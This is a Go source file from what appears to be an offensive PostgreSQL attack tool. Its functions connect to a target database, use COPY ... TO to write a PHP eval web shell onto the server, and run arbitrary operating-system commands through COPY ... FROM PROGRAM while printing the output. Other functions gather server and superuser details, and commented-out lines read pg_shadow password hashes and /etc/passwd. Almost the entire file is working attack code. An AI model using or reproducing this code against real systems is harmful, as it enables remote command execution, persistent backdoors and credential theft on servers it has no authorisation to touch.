package cmdpackage

import (
	"Rpcon/common"
	"Rpcon/pkg"
	"database/sql"
	"fmt"
	_ "github.com/lib/pq"
	"log"
	"os"
)

var shell string

var pocfg = []string{"select version();",
	"SELECT current_setting('server_version_num');",
	"SELECT current_setting('is_superuser');",
	//"postgres=# \\du",
	//"SELECT usename, passwd FROM pg_shadow;\n",
	// "copy (select '<?php phpinfo();?>') to '/tmp/1.php';",
	"select setting from pg_settings where name='config_file'",
	"select setting from pg_settings where name = 'data_directory';",
	// "select/**/PG_READ_FILE($$/etc/passwd$$)",
	//"DROP TABLE IF EXISTS cmd_exec;",
	//"CREATE TABLE cmd_exec(cmd_output text);",
	//"copy cmd_exec FROM PROGRAM 'whoami';",
	//"SELECT * FROM cmd_exec;",
}

func Postconn() (*sql.DB, error) {
	pdqlInfo := fmt.Sprintf("host=%s port=%d user=%s "+"password=%s dbname=%s", common.Host, common.Port, common.User, common.Password, common.DBname)
	db, err := sql.Open("postgres", pdqlInfo)
	if err != nil {
		log.Println("Open Connection failed:", err.Error())
		os.Exit(0)
	}
	//db.SetMaxOpenConns(20) //设置数据库连接池最大连接数
	//db.SetMaxIdleConns(10) //设置最大空闲连接数
	//defer db.Close()
	return db, err
}

func Powriteshell() {
	conn, err := Postconn()
	if common.File != "" {
		shell, err = pkg.Readfile(common.File)
		if err != nil {
			log.Println("打开文件失败")
		}
	} else {
		shell = "<?php @eval($_POST[1]);?>"
	}
	webshell := fmt.Sprintf("copy (select '%s') to '%s';", shell, common.Path)
	_, err = conn.Query(webshell)
	if err != nil {
		log.Println("写入shell失败", err)
	} else {
		log.Println("写入shell成功")
	}
}

func Pocode() {
	conn, _ := Postconn()
	//通过Statement执行查询
	code := fmt.Sprintf("copy cmd_exec FROM PROGRAM '%s';", common.Code)
	conn.Query("DROP TABLE IF EXISTS cmd_exec;")
	conn.Query("CREATE TABLE cmd_exec(cmd_output text);")
	conn.Query(code)

	rows, err := conn.Query("SELECT * FROM cmd_exec;")
	if err != nil {
		log.Fatal("Query failed:", err.Error())
	}

	//建立一个列数组
	cols, err := rows.Columns()
	var colsdata = make([]interface{}, len(cols))
	for i := 0; i < len(cols); i++ {
		colsdata[i] = new(interface{})
		//fmt.Print(cols[i])
		fmt.Print("\t")
	}
	fmt.Println()

	//遍历每一行
	for rows.Next() {
		rows.Scan(colsdata...) //将查到的数据写入到这行中
		pkg.PrintRow(colsdata) //打印此行
	}
	defer rows.Close()
	defer conn.Close()

}

func PoQuery() {
	conn, _ := Postconn()
	stmt, err := conn.Prepare(common.Code)
	if err != nil {
		log.Fatal("Prepare failed:", err.Error())
	}
	defer stmt.Close()
	//通过Statement执行查询
	rows, err := stmt.Query()
	if err != nil {
		log.Fatal("Query failed:", err.Error())
	}

	//建立一个列数组
	cols, err := rows.Columns()
	var colsdata = make([]interface{}, len(cols))
	for i := 0; i < len(cols); i++ {
		colsdata[i] = new(interface{})
		fmt.Print(cols[i])
		fmt.Print("\t")
	}
	fmt.Println()

	//遍历每一行
	for rows.Next() {
		rows.Scan(colsdata...) //将查到的数据写入到这行中
		pkg.PrintRow(colsdata) //打印此行
	}
	defer rows.Close()
}

func Pocfg() {
	conn, err := Postconn()
	if err != nil {
		fmt.Println(err)
	}
	for i := range pocfg {
		rows, err := conn.Query(pocfg[i])
		if err != nil {
			log.Fatal("Query failed:", err.Error())
		}

		//建立一个列数组
		cols, err := rows.Columns()
		var colsdata = make([]interface{}, len(cols))
		for i := 0; i < len(cols); i++ {
			colsdata[i] = new(interface{})
			fmt.Print(cols[i])
			//fmt.Print("\t")
		}
		fmt.Println()

		//遍历每一行
		for rows.Next() {
			rows.Scan(colsdata...) //将查到的数据写入到这行中
			pkg.PrintRow(colsdata) //打印此行
		}
		defer rows.Close()
		defer conn.Close()
	}
}
